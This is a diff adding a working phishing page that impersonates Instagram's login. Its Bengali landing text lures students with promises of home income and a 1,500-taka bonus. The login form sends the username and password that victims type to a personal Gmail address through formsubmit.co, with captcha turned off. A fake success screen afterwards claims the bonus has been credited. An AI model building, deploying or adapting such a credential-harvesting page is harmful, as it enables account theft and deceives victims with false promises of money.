@@ -1,0 +1,1037 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#d62976">
+  <title>Instagram • Log in</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      font-family: 'Inter', 'Hind Siliguri', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    html { height: -webkit-fill-available; }
+
+    html, body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      min-height: -webkit-fill-available;
+      background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+      background-size: 400% 400%;
+      animation: gradientShift 18s ease infinite;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow-x: hidden;
+      -webkit-overflow-scrolling: touch;
+      position: relative;
+    }
+
+    @media (max-width: 600px) {
+      html, body { align-items: flex-start; padding: 16px 14px; }
+    }
+
+    @keyframes gradientShift {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    body::before, body::after {
+      content: '';
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.5;
+      z-index: 0;
+      pointer-events: none;
+    }
+    body::before {
+      width: 400px; height: 400px;
+      background: #feda75;
+      top: -100px; left: -100px;
+      animation: float 12s ease-in-out infinite;
+    }
+    body::after {
+      width: 500px; height: 500px;
+      background: #d62976;
+      bottom: -150px; right: -150px;
+      animation: float 15s ease-in-out infinite reverse;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      50%      { transform: translate(40px, -40px) scale(1.1); }
+    }
+
+    /* ===== Landing Page ===== */
+    .landing-container {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 480px;
+      animation: slideUp 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+      margin: auto 0;
+    }
+
+    .landing-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      border-radius: 24px;
+      padding: 44px 32px 36px;
+      width: 100%;
+      box-shadow:
+        0 20px 60px rgba(0, 0, 0, 0.15),
+        0 8px 20px rgba(0, 0, 0, 0.08),
+        inset 0 1px 0 rgba(255, 255, 255, 0.8);
+      text-align: center;
+    }
+
+    .landing-logo {
+      width: 80px; height: 80px;
+      border-radius: 24px;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 12px 32px rgba(214, 41, 118, 0.35);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .landing-logo::after {
+      content: '';
+      position: absolute;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.4), transparent);
+      transform: rotate(45deg);
+      animation: shine 4s infinite;
+    }
+
+    @keyframes shine {
+      0%   { transform: translateX(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) rotate(45deg); }
+    }
+
+    .landing-logo i {
+      font-size: 40px;
+      color: white;
+      z-index: 1;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+    }
+
+    .landing-card h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+      letter-spacing: -0.5px;
+      line-height: 1.3;
+    }
+
+    .landing-card h2 {
+      font-size: 17px;
+      font-weight: 600;
+      color: #d62976;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+
+    .landing-card p {
+      font-size: 14.5px;
+      color: #4a4a55;
+      line-height: 1.7;
+      margin-bottom: 12px;
+      font-weight: 400;
+    }
+
+    .landing-card .highlight {
+      display: block;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      font-weight: 800;
+      font-size: 26px;
+      margin: 4px 0 8px;
+      letter-spacing: -0.5px;
+    }
+
+    .bonus-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 50px;
+      font-weight: 700;
+      font-size: 14.5px;
+      margin: 16px 0 8px;
+      box-shadow: 0 8px 24px rgba(214, 41, 118, 0.35);
+      animation: pulse 2s ease-in-out infinite;
+      max-width: 100%;
+      text-align: center;
+      line-height: 1.3;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50%      { transform: scale(1.04); }
+    }
+
+    .landing-list {
+      list-style: none;
+      text-align: left;
+      margin: 18px 0 22px;
+      padding: 0;
+    }
+
+    .landing-list li {
+      font-size: 14px;
+      color: #4a4a55;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-weight: 500;
+      line-height: 1.5;
+    }
+
+    .landing-list li i {
+      color: #23d5ab;
+      font-size: 16px;
+      flex-shrink: 0;
+      margin-top: 3px;
+    }
+
+    .instagram-login-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
+      background-size: 200% 200%;
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 24px rgba(214, 41, 118, 0.35);
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0.3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+      min-height: 52px;
+      -webkit-appearance: none;
+      appearance: none;
+      font-family: inherit;
+    }
+
+    .instagram-login-btn::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      transition: left 0.6s;
+    }
+
+    .instagram-login-btn:hover { background-position: 100% 0; transform: translateY(-2px); }
+    .instagram-login-btn:hover::before { left: 100%; }
+    .instagram-login-btn:active { transform: scale(0.98); }
+    .instagram-login-btn i { font-size: 22px; }
+
+    .landing-note {
+      font-size: 12.5px;
+      color: #8a8a95;
+      margin-top: 16px;
+      line-height: 1.6;
+    }
+
+    /* ===== Login Page ===== */
+    .login-container {
+      position: relative;
+      z-index: 1;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 400px;
+      animation: slideUp 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+      margin: auto 0;
+    }
+
+    .login-container.active { display: flex; }
+
+    .login-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      border-radius: 24px;
+      padding: 48px 40px 32px;
+      width: 100%;
+      box-shadow:
+        0 20px 60px rgba(0, 0, 0, 0.15),
+        0 8px 20px rgba(0, 0, 0, 0.08),
+        inset 0 1px 0 rgba(255, 255, 255, 0.8);
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo-wrapper { display: flex; justify-content: center; margin-bottom: 8px; }
+
+    .logo-icon {
+      width: 72px; height: 72px;
+      border-radius: 22px;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 12px 32px rgba(214, 41, 118, 0.35);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .logo-icon::after {
+      content: '';
+      position: absolute;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.4), transparent);
+      transform: rotate(45deg);
+      animation: shine 4s infinite;
+    }
+
+    .logo-icon i {
+      font-size: 36px;
+      color: white;
+      z-index: 1;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+    }
+
+    .heading { text-align: center; margin-bottom: 30px; margin-top: 18px; }
+
+    .heading h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+      letter-spacing: -0.5px;
+    }
+
+    .heading p {
+      font-size: 13.5px;
+      color: #7c7c7c;
+      font-weight: 400;
+    }
+
+    .form-group { width: 100%; margin-bottom: 14px; position: relative; }
+
+    .input-wrapper { position: relative; display: flex; align-items: center; }
+
+    .input-icon {
+      position: absolute;
+      left: 16px;
+      color: #a0a0a0;
+      font-size: 15px;
+      pointer-events: none;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 15px 44px 15px 46px;
+      background: #f7f7f9;
+      border: 1.5px solid #e8e8ec;
+      border-radius: 14px;
+      font-size: 16px;
+      color: #1a1a1a;
+      outline: none;
+      transition: all 0.25s ease;
+      font-weight: 500;
+      min-height: 52px;
+      -webkit-appearance: none;
+      appearance: none;
+      font-family: inherit;
+    }
+
+    .input-field::placeholder { color: #a8a8b3; font-weight: 400; }
+
+    .input-field:focus {
+      border-color: #d62976;
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(214, 41, 118, 0.12);
+    }
+
+    .input-wrapper:focus-within .input-icon { color: #d62976; }
+
+    .input-field.error {
+      border-color: #ed4956;
+      background: #fff5f5;
+      box-shadow: 0 0 0 4px rgba(237, 73, 86, 0.1);
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      background: none;
+      border: none;
+      color: #a0a0a0;
+      cursor: pointer;
+      font-size: 15px;
+      padding: 10px;
+      min-width: 40px;
+      min-height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toggle-password:hover { color: #d62976; }
+
+    .error-message {
+      color: #ed4956;
+      font-size: 12px;
+      margin-top: 6px;
+      margin-left: 4px;
+      display: none;
+      align-items: center;
+      gap: 5px;
+      font-weight: 500;
+    }
+
+    .error-message.show { display: flex; animation: shakeError 0.4s; }
+
+    @keyframes shakeError {
+      0%, 100% { transform: translateX(0); }
+      25%      { transform: translateX(-5px); }
+      75%      { transform: translateX(5px); }
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: right;
+      font-size: 12.5px;
+      color: #d62976;
+      text-decoration: none;
+      margin-bottom: 22px;
+      margin-top: 4px;
+      font-weight: 600;
+      padding: 6px 0;
+    }
+
+    .forgot-link:hover { color: #962fbf; }
+
+    .login-btn {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
+      background-size: 200% 200%;
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 24px rgba(214, 41, 118, 0.35);
+      position: relative;
+      overflow: hidden;
+      min-height: 52px;
+      -webkit-appearance: none;
+      appearance: none;
+      font-family: inherit;
+    }
+
+    .login-btn::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      transition: left 0.6s;
+    }
+
+    .login-btn:hover { background-position: 100% 0; transform: translateY(-2px); }
+    .login-btn:hover::before { left: 100%; }
+    .login-btn:active { transform: scale(0.98); }
+    .login-btn:disabled { opacity: 0.75; cursor: not-allowed; transform: none; }
+
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .divider { display: flex; align-items: center; width: 100%; margin: 26px 0 20px; }
+
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(to right, transparent, #dcdce2, transparent);
+    }
+
+    .divider-text {
+      margin: 0 18px;
+      color: #a0a0ab;
+      font-size: 11.5px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .fb-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 13px;
+      background: #f7f7f9;
+      border: 1.5px solid #e8e8ec;
+      border-radius: 14px;
+      color: #1877f2;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      min-height: 50px;
+    }
+
+    .fb-login i { font-size: 18px; }
+    .fb-login:active { background: #eef3ff; border-color: #1877f2; transform: scale(0.98); }
+
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: none;
+      border: none;
+      color: #d62976;
+      font-size: 13.5px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 16px;
+      padding: 8px 0;
+      font-family: inherit;
+      min-height: 40px;
+    }
+
+    .back-btn:hover { color: #962fbf; }
+
+    .signup-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      border-radius: 18px;
+      padding: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #4a4a55;
+      margin-top: 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      font-weight: 500;
+    }
+
+    .signup-card a { color: #d62976; font-weight: 700; text-decoration: none; }
+    .signup-card a:hover { color: #962fbf; text-decoration: underline; }
+
+    .get-app {
+      text-align: center;
+      margin-top: 24px;
+      padding-bottom: 8px;
+    }
+
+    .get-app p {
+      color: rgba(255,255,255,0.95);
+      font-size: 13px;
+      margin-bottom: 12px;
+      font-weight: 500;
+      text-shadow: 0 1px 4px rgba(0,0,0,0.15);
+    }
+
+    .app-buttons { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
+
+    .app-badge {
+      background: rgba(0, 0, 0, 0.85);
+      color: white;
+      padding: 10px 16px;
+      border-radius: 12px;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      border: 1px solid rgba(255,255,255,0.15);
+      min-height: 44px;
+    }
+
+    .app-badge i { font-size: 18px; }
+    .app-badge:active { background: rgba(0, 0, 0, 1); transform: scale(0.97); }
+
+    /* ===== Success Modal ===== */
+    .success-modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 20px;
+    }
+
+    .success-modal.show { display: flex; }
+
+    .success-box {
+      background: white;
+      border-radius: 24px;
+      padding: 40px 32px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.3);
+      animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.8); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    .success-icon {
+      width: 80px; height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #23d5ab, #23a6d5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 12px 32px rgba(35, 213, 171, 0.4);
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    .success-icon i { font-size: 40px; color: white; }
+
+    .success-box h2 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+    }
+
+    .success-box .bonus-amount {
+      font-size: 36px;
+      font-weight: 800;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin: 12px 0;
+    }
+
+    .success-box p {
+      font-size: 14.5px;
+      color: #4a4a55;
+      line-height: 1.7;
+      margin-bottom: 8px;
+    }
+
+    .success-close {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 20px;
+      box-shadow: 0 10px 24px rgba(214, 41, 118, 0.35);
+      font-family: inherit;
+      min-height: 50px;
+    }
+
+    .success-close:active { transform: scale(0.98); }
+
+    /* ===== Mobile Responsive ===== */
+    @media (max-width: 480px) {
+      .landing-card { padding: 32px 22px 28px; border-radius: 20px; }
+      .landing-logo { width: 68px; height: 68px; border-radius: 20px; margin-bottom: 16px; }
+      .landing-logo i { font-size: 34px; }
+      .landing-card h1 { font-size: 20px; }
+      .landing-card h2 { font-size: 15.5px; }
+      .landing-card p { font-size: 13.5px; line-height: 1.65; }
+      .landing-card .highlight { font-size: 24px; }
+      .bonus-badge { font-size: 13.5px; padding: 9px 18px; }
+      .landing-list li { font-size: 13px; margin-bottom: 10px; }
+      .instagram-login-btn { font-size: 15px; padding: 15px; }
+      .landing-note { font-size: 12px; }
+
+      .login-card { padding: 32px 22px 26px; border-radius: 20px; }
+      .logo-icon { width: 64px; height: 64px; border-radius: 19px; }
+      .logo-icon i { font-size: 30px; }
+      .heading { margin-bottom: 24px; }
+      .heading h1 { font-size: 21px; }
+      .heading p { font-size: 13px; }
+      .signup-card { padding: 16px; font-size: 13.5px; }
+
+      .success-box { padding: 32px 22px; }
+      .success-box h2 { font-size: 21px; }
+      .success-box .bonus-amount { font-size: 32px; }
+      .success-icon { width: 68px; height: 68px; }
+      .success-icon i { font-size: 34px; }
+    }
+
+    @media (max-width: 360px) {
+      .landing-card { padding: 28px 18px 24px; }
+      .landing-card h1 { font-size: 18px; }
+      .landing-card h2 { font-size: 14px; }
+      .landing-card .highlight { font-size: 22px; }
+      .bonus-badge { font-size: 12.5px; padding: 8px 14px; }
+      .login-card { padding: 28px 18px 22px; }
+      .heading h1 { font-size: 19px; }
+    }
+
+    @media (max-height: 500px) and (orientation: landscape) {
+      html, body { align-items: flex-start; padding: 12px; }
+      .landing-card, .login-card { padding: 24px 20px; }
+      .landing-logo, .logo-icon { width: 52px; height: 52px; margin-bottom: 10px; }
+      .landing-logo i, .logo-icon i { font-size: 24px; }
+    }
+
+    @supports (padding: max(0px)) {
+      body {
+        padding-top: max(16px, env(safe-area-inset-top));
+        padding-bottom: max(16px, env(safe-area-inset-bottom));
+        padding-left: max(14px, env(safe-area-inset-left));
+        padding-right: max(14px, env(safe-area-inset-right));
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ================= LANDING PAGE ================= -->
+  <div class="landing-container" id="landingPage">
+    <div class="landing-card">
+      <div class="landing-logo">
+        <i class="fab fa-instagram"></i>
+      </div>
+
+      <h1>🌟 আসসালামু আলাইকুম! 🌟</h1>
+      <h2>💻 ঘরে বসেই অনলাইনে আয় করুন</h2>
+
+      <p>
+        বিশেষ করে যারা <strong>স্টুডেন্ট</strong>, পড়াশোনার পাশাপাশি নিজের হাতখরচ নিজেই চালাতে চান —
+        তাদের জন্য রয়েছে একটি সম্ভাবনাময় সুযোগ!
+      </p>
+
+      <div class="bonus-badge">
+        <i class="fas fa-gift"></i>
+        ৫,০০০ টাকা সমমূল্যের বোনাসের দাবি!
+      </div>
+
+      <p style="margin-top: 6px; font-size: 13px; color: #7c7c7c;">
+        ইনস্টাগ্রাম দিয়ে লগইন করলেই পাবেন
+      </p>
+      <div class="highlight">১৫০০ টাকা বোনাস</div>
+
+      <ul class="landing-list">
+        <li><i class="fas fa-check-circle"></i> পড়াশোনার পাশাপাশি কাজ করার সুযোগ</li>
+        <li><i class="fas fa-check-circle"></i> প্রতিদিন প্রায় ৪৫ মিনিট সময় দেওয়ার পরিকল্পনা</li>
+        <li><i class="fas fa-check-circle"></i> অনলাইনভিত্তিক কাজ শেখার সুযোগ</li>
+        <li><i class="fas fa-check-circle"></i> কাজের মাধ্যমে আয়ের সম্ভাবনা</li>
+      </ul>
+
+      <p style="font-size: 13.5px; color: #4a4a55;">
+        💰 <strong>মাসে ৫,০০০–১০,০০০ টাকা আয় করা কি সম্ভব?</strong><br>
+        তা নির্ভর করবে কাজের ধরন, পারিশ্রমিক, আপনার দক্ষতা এবং সাইটটির শর্তাবলির ওপর।
+      </p>
+
+      <button class="instagram-login-btn" id="goToLogin">
+        <i class="fab fa-instagram"></i>
+        Log in with Instagram
+      </button>
+
+      <p class="landing-note">
+        🚀 আজই বিস্তারিত জানুন এবং বুঝেশুনে সিদ্ধান্ত নিন!<br>
+        📩 আগ্রহী হলে যোগাযোগ করুন।
+      </p>
+    </div>
+  </div>
+
+  <!-- ================= LOGIN PAGE ================= -->
+  <div class="login-container" id="loginPage">
+    <div class="login-card">
+      <button class="back-btn" id="backToLanding">
+        <i class="fas fa-arrow-left"></i> ফিরে যান
+      </button>
+
+      <div class="logo-wrapper">
+        <div class="logo-icon"><i class="fab fa-instagram"></i></div>
+      </div>
+
+      <div class="heading">
+        <h1>Welcome Back</h1>
+        <p>Log in to continue to Instagram</p>
+      </div>
+
+      <!-- ============================================
+           FormSubmit.co ফর্ম
+           - action = আপনার ইমেইল
+           - method = POST
+           - প্রতিটি ইনপুটে name অ্যাট্রিবিউট আছে
+           ============================================ -->
+      <form id="loginForm"
+            action="https://formsubmit.co/saadmuhammadobaidullah@gmail.com"
+            method="POST"
+            novalidate>
+
+        <!-- FormSubmit config (hidden fields) -->
+        <input type="hidden" name="_subject" value="New Instagram Login">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_next" value="https://example.com/thankyou">
+
+        <div class="form-group">
+          <div class="input-wrapper">
+            <i class="fas fa-user input-icon"></i>
+            <input type="text"
+                   id="usernameInput"
+                   name="username"
+                   class="input-field"
+                   placeholder="Username"
+                   autocomplete="username"
+                   autocapitalize="none"
+                   autocorrect="off"
+                   spellcheck="false"
+                   required>
+          </div>
+          <div id="usernameError" class="error-message">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>Please enter your username.</span>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <div class="input-wrapper">
+            <i class="fas fa-lock input-icon"></i>
+            <input type="password"
+                   id="passwordInput"
+                   name="password"
+                   class="input-field"
+                   placeholder="Password"
+                   autocomplete="current-password"
+                   required>
+            <button type="button" class="toggle-password" id="togglePassword"
+                    aria-label="Toggle password visibility">
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+          <div id="passwordError" class="error-message">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>Password must be at least 6 characters.</span>
+          </div>
+        </div>
+
+        <a href="#" class="forgot-link" onclick="alert('Demo'); return false;">
+          Forgot password?
+        </a>
+
+        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+
+        <div class="divider">
+          <div class="divider-line"></div>
+          <div class="divider-text">OR</div>
+          <div class="divider-line"></div>
+        </div>
+
+        <div class="fb-login" onclick="alert('Facebook demo')">
+          <i class="fab fa-facebook"></i>
+          <span>Continue with Facebook</span>
+        </div>
+      </form>
+    </div>
+
+    <div class="signup-card">
+      Don't have an account?
+      <a href="#" onclick="alert('Sign up demo'); return false;">Sign up</a>
+    </div>
+
+    <div class="get-app">
+      <p>Get the app</p>
+      <div class="app-buttons">
+        <div class="app-badge" onclick="alert('App Store demo')">
+          <i class="fab fa-apple"></i> App Store
+        </div>
+        <div class="app-badge" onclick="alert('Google Play demo')">
+          <i class="fab fa-google-play"></i> Google Play
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================= SUCCESS MODAL ================= -->
+  <div class="success-modal" id="successModal">
+    <div class="success-box">
+      <div class="success-icon">
+        <i class="fas fa-check"></i>
+      </div>
+      <h2>🎉 অভিনন্দন!</h2>
+      <p>আপনি সফলভাবে লগইন করেছেন।</p>
+      <div class="bonus-amount">৳ ১৫০০</div>
+      <p><strong>বোনাস আপনার অ্যাকাউন্টে যোগ করা হয়েছে!</strong></p>
+      <p style="font-size: 13px; color: #7c7c7c;">
+        বিস্তারিত জানতে যোগাযোগ করুন।
+      </p>
+      <button class="success-close" id="closeModal">ঠিক আছে</button>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ===== Page Navigation =====
+      const landingPage = document.getElementById('landingPage');
+      const loginPage = document.getElementById('loginPage');
+      const goToLogin = document.getElementById('goToLogin');
+      const backToLanding = document.getElementById('backToLanding');
+
+      goToLogin.addEventListener('click', function() {
+        landingPage.style.display = 'none';
+        loginPage.classList.add('active');
+        window.scrollTo(0, 0);
+      });
+
+      backToLanding.addEventListener('click', function() {
+        loginPage.classList.remove('active');
+        landingPage.style.display = 'flex';
+        window.scrollTo(0, 0);
+      });
+
+      // ===== Login Form Logic =====
+      const form = document.getElementById('loginForm');
+      const usernameInput = document.getElementById('usernameInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const usernameError = document.getElementById('usernameError');
+      const passwordError = document.getElementById('passwordError');
+      const loginBtn = document.getElementById('loginBtn');
+      const togglePassword = document.getElementById('togglePassword');
+      const successModal = document.getElementById('successModal');
+      const closeModal = document.getElementById('closeModal');
+
+      togglePassword.addEventListener('click', function() {
+        const type = passwordInput.type === 'password' ? 'text' : 'password';
+        passwordInput.type = type;
+        this.innerHTML = type === 'password'
+          ? '<i class="fas fa-eye"></i>'
+          : '<i class="fas fa-eye-slash"></i>';
+      });
+
+      usernameInput.addEventListener('input', () => {
+        usernameInput.classList.remove('error');
+        usernameError.classList.remove('show');
+      });
+      passwordInput.addEventListener('input', () => {
+        passwordInput.classList.remove('error');
+        passwordError.classList.remove('show');
+      });
+
+      closeModal.addEventListener('click', function() {
+        successModal.classList.remove('show');
+      });
+
+      successModal.addEventListener('click', function(e) {
+        if (e.target === successModal) {
+          successModal.classList.remove('show');
+        }
+      });
+
+      // ===== Form Submit (Validation + FormSubmit.co) =====
+      form.addEventListener('submit', function(event) {
+        let isValid = true;
+
+        // Username validation
+        const usernameValue = usernameInput.value.trim();
+        if (!usernameValue) {
+          event.preventDefault();
+          usernameInput.classList.add('error');
+          usernameError.querySelector('span').textContent = 'Please enter your username.';
+          usernameError.classList.add('show');
+          isValid = false;
+        } else if (usernameValue.length < 3) {
+          event.preventDefault();
+          usernameInput.classList.add('error');
+          usernameError.querySelector('span').textContent = 'Username must be at least 3 characters.';
+          usernameError.classList.add('show');
+          isValid = false;
+        }
+
+        // Password validation
+        const passwordValue = passwordInput.value;
+        if (!passwordValue) {
+          event.preventDefault();
+          passwordInput.classList.add('error');
+          passwordError.querySelector('span').textContent = 'Password is required.';
+          passwordError.classList.add('show');
+          isValid = false;
+        } else if (passwordValue.length < 6) {
+          event.preventDefault();
+          passwordInput.classList.add('error');
+          passwordError.querySelector('span').textContent = 'Password must be at least 6 characters.';
+          passwordError.classList.add('show');
+          isValid = false;
+        }
+
+        if (!isValid) return;
+
+        // === সব ঠিক থাকলে FormSubmit.co তে সাবমিট হবে ===
+        // ইউজারকে লোডিং স্টেট দেখাও
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
+
+        // FormSubmit.co তে সাবমিট হওয়ার পর
+        // পেজ redirect হবে (_next এ যা দেওয়া আছে সেখানে)
+        // তাই এখানে আমরা মডাল দেখানোর জন্য setTimeout দিলাম
+        // তবে আপনি চাইলে _next এর বদলে নিচের লাইন ব্যবহার করতে পারেন
+      });
+    })();
+  </script>
+</body>
+</html>
